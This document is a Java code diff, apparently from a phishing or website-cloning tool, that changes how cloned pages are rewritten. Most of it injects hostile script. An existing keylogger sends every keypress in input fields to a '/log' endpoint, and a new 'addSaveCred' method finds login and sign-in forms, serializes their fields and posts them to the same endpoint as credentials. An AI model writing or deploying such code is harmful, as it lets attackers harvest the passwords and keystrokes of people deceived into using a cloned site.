@@ -96,6 +96,7 @@ public class WebsiteProcessor {
 		
 		//add jquery
 		doc.head().prepend("<script src='http://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js'></script>");
+		doc.head().prepend("<script src='jquery.serializeJSON.min.js'></script>");
 		Element iconHeader = doc.select("meta[itemprop]").first();
 		if(iconHeader!=null && iconHeader.attr("content")!=null){
 			doc.head().prepend("<link rel='shortcut icon' href='"+"http://"+ci.getBase()+iconHeader.attr("content")+"'>");
@@ -118,6 +119,9 @@ public class WebsiteProcessor {
 		if(config.keylogger){
 			addKeylogger(ri,doc);
 		}
+		if(config.saveCred){
+			addSaveCred(ri,doc);
+		}
 		//popup message
 		if(config.popUpMessage!=null && !config.popUpMessage.equals("")){
 			addPopUpMessage(ri,doc);
@@ -137,10 +141,6 @@ public class WebsiteProcessor {
 	private void addPopUpMessage(RequestInfo ri, Document doc) {
 		String msg = config.popUpMessage.replaceAll("'", "\\\\'");
 		msg = msg.replaceAll("\"", "\\\\\"");
-		Elements forms = doc.select("form");
-		for(Element form:forms){
-			form.attr("action","");
-		}
 		Elements buttons = doc.select("input[type=submit]");
 		buttons.addAll(doc.select("input[type=button]"));
 		buttons.addAll(doc.select("button"));
@@ -149,19 +149,40 @@ public class WebsiteProcessor {
 			button.attr("onclick",clickEventHandler);
 		}
 	}
+	private void disableAllForms(RequestInfo ri, Document doc){
+		Elements forms = doc.select("form");
+		for(Element form:forms){
+			form.attr("action","");
+		}
+	}
 	private void addKeylogger(RequestInfo ri,Document doc){
 		Elements inputs = doc.select("input");
 		for(Element input:inputs){
 			if(input.attr("id")!=null && !input.attr("id").equals("")){
 				String keyString ="'"+input.attr("id")+"'";
 				String valueString = "$('#"+input.attr("id")+"').val()";
-				String var = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.KEY_LOG_VALUE+"'};";
+				String varKeyLog = "var d = {url:'"+ri.url+"',key:"+keyString+",value:"+valueString+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.KEY_LOG_VALUE+"'};";
 				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
-				String complete = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
-				var+
+				String completeKeylogger = "<script> $( '#"+input.attr("id")+"' ).keypress(function() {"+
+						varKeyLog+
 				ajaxString+
 				"}) </script>";
-				doc.append(complete);
+				doc.append(completeKeylogger);
+			}
+		}
+	}
+	private void addSaveCred(RequestInfo ri, Document doc){
+		this.disableAllForms(ri, doc);
+		Elements loginForms = doc.select("form");
+		loginForms.addAll(doc.select("div"));
+		for(Element loginForm:loginForms){
+			String name = (loginForm.id()+" "+loginForm.attr("name")).toLowerCase();
+			if(name.contains("login") || name.contains("sign")){
+				String formSerialization = "JSON.stringify($('#"+loginForm.id()+", form[name="+loginForm.attr("name")+"]').serializeArray())"; 
+				String varCred = "var d = {url:'"+ri.url+"',key:'"+loginForm.id()+"',value:"+formSerialization+","+Logger.Logger.LOG_PARAM+":'"+Logger.Logger.CREDENTIAL_LOG_VALUE+"'};";
+				String ajaxString = "$.ajax({url:'/log',type: 'POST',data:d})";
+				String completeCredentialSubmit = "(function(){"+varCred+ajaxString+"})()";
+				loginForm.attr("onsubmit",completeCredentialSubmit);
 			}
 		}
 	}
